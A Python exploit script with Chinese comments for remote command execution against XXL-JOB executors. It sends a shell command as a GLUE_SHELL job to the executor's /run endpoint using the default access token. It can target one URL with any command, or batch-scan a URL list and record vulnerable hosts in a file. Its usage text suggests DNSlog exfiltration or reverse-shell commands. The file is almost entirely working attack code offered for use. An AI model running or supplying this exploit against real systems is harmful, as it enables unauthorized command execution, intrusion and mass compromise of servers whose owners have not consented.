import time
import requests
import random
import argparse

# 漏洞测试模块
def exp(url,cmd="whoami"):
    jobid = str(random.randint(100000, 999999))
    times = round(time.time() * 1000)
    headers = {
      'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
      'Content-Type': 'application/json',
      'XXL-JOB-ACCESS-TOKEN': 'default_token'
    }
    data = '''{
      "jobId": ''' + jobid + ''',
      "executorHandler": "demoJobHandler",
      "executorParams": "demoJobHandler",
      "executorBlockStrategy": "COVER_EARLY",
      "executorTimeout": 0,
      "logId": 1,
      "logDateTime": 1586629003729,
      "glueType": "GLUE_SHELL",
      "glueSource": "''' + cmd + '''",
      "glueUpdatetime":''' + str(times) + ''',
      "broadcastIndex": 0,
      "broadcastTotal": 0
    }'''
    try:
        response = requests.post(url=url+"/run",headers=headers,data=data,timeout=10,verify=False)
        if response.status_code == 200 and '200' in response.text:
            return "[+]目标存在漏洞："+url
        else:
            return "[-]目标不存在漏洞..."
    except:
        return "[-]存在网络链接问题！！！"
# 批量漏洞检测
def check(filepath):
    urls = [x.strip() for x in open(filepath, "r").readlines()]
    for url in urls:
        rsConn = exp(url, cmd="whoami")
        print(rsConn)
        if '+' in rsConn:
            with open("success.txt","a",encoding="utf-8") as file:
                file.write(rsConn+'\n')
                file.close()
    return

# usage信息打印
def usage():
    banner = """Y88b   d88P Y88b   d88P 888    888888          888              8888888b.                  
 Y88b d88P   Y88b d88P  888      "88b          888              888   Y88b                 
  Y88o88P     Y88o88P   888       888          888              888    888                 
   Y888P       Y888P    888       888  .d88b.  88888b.          888   d88P .d8888b .d88b.  
   d888b       d888b    888       888 d88""88b 888 "88b         8888888P" d88P"   d8P  Y8b 
  d88888b     d88888b   888       888 888  888 888  888         888 T88b  888     88888888 
 d88P Y88b   d88P Y88b  888       88P Y88..88P 888 d88P         888  T88b Y88b.   Y8b.     
d88P   Y88b d88P   Y88b 88888888  888  "Y88P"  88888P" 88888888 888   T88b "Y8888P "Y8888  
                                .d88P                                                      
                              .d88P"                                                       
                             888P"                                                         
"""
    print(banner)
    print("[@]单个命令执行:xxl_jobRce.py --url http://www.xxx.com --cmd \"Dnslog外带或反弹shell命令\"")
    print("[@]批量漏洞检测:xxl_jobRce.py --file urls.txt 结果请查看success.txt文件！")
    print("[@]请使用--help参数查看说明信息！")
    print(" "*60 + "author:F41ao")
    print(" "*60 + "--help see infomation")
# 主程序模块
def main():
    parse = argparse.ArgumentParser(description="XXL_Job漏洞攻击程序！使用方式如下...")
    parse.add_argument("-u", "--url", type=str, help="设置攻击目标网址，格式：http://www.xxx.com")
    parse.add_argument("-c", "--cmd", type=str, default="whoami", help="指定要攻击执行的命令,含有空格用引号包围")
    parse.add_argument('-f', "--file", type=str, help="指定文件进行批量测试，注意文件路径")
    parses = parse.parse_args()
    if parses.url and not parses.file:
        print(exp(parses.url, cmd=parses.cmd))
    elif not parses.url and parses.file:
        print('[@]开始批量测试....')
        check(parses.file)
    else:
        usage()
if __name__ == '__main__':
    main() #程序启动....






